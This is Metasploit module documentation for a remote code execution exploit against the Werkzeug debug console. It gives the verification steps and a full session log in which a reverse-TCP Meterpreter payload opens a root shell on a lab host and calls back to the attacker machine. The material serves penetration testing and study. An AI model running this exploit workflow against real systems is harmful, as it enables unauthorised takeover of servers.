## Vulnerable Application

Verified against:
  + 0.9.6 on Debian
  + 0.9.6 on Centos
  + 0.10 on Debian
  
A sample application which enables the console debugger is available [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/werkzeug_console.py)

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/multi/http/werkzeug_debug_rce`
  4. Do: `set rport <port>`
  5. Do: `set rhost <ip>`
  6. Do: `check`
```
[+] 10.108.106.201:8081 - The target is vulnerable.
```
  7. Do: `set payload python/meterpreter/reverse_tcp`
  8. Do: `set lhost <ip>`
  9. Do: `exploit`
  10. You should get a shell.

## Options

  **TARGETURI**

  TARGETURI by default is `/console`, as defined by werkzeug, however it can be changed within the python script.

## Scenarios

Example utilizing the previously mentioned sample app listed above.

```
msf > use exploit/multi/http/werkzeug_debug_rce
msf exploit(werkzeug_debug_rce) > set rport 8081
rport => 8081
msf exploit(werkzeug_debug_rce) > set rhost 10.108.106.201
rhost => 10.108.106.201
msf exploit(werkzeug_debug_rce) > check
[+] 10.108.106.201:8081 - The target is vulnerable.
msf exploit(werkzeug_debug_rce) > set payload python/meterpreter/reverse_tcp
payload => python/meterpreter/reverse_tcp
msf exploit(werkzeug_debug_rce) > set lhost 10.108.106.121
lhost => 10.108.106.121
msf exploit(werkzeug_debug_rce) > exploit

[*] Started reverse handler on 10.108.106.121:4444
[*] Sending stage (25277 bytes) to 10.108.106.201
[*] Meterpreter session 2 opened (10.108.106.121:4444 -> 10.108.106.201:36720) at 2015-07-09 19:02:52 -0400

meterpreter > getpid
Current pid: 13034
meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : werkzeug
OS           : Linux 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt11-1 (2015-05-24)
Architecture : x86_64
Meterpreter  : python/python
meterpreter > shell
Process 13037 created.
Channel 0 created.
/bin/sh: 0: can't access tty; job control turned off
# ls
app.py  app.pyc  werkzeug
# exit
meterpreter > exit
[*] Shutting down Meterpreter...
```
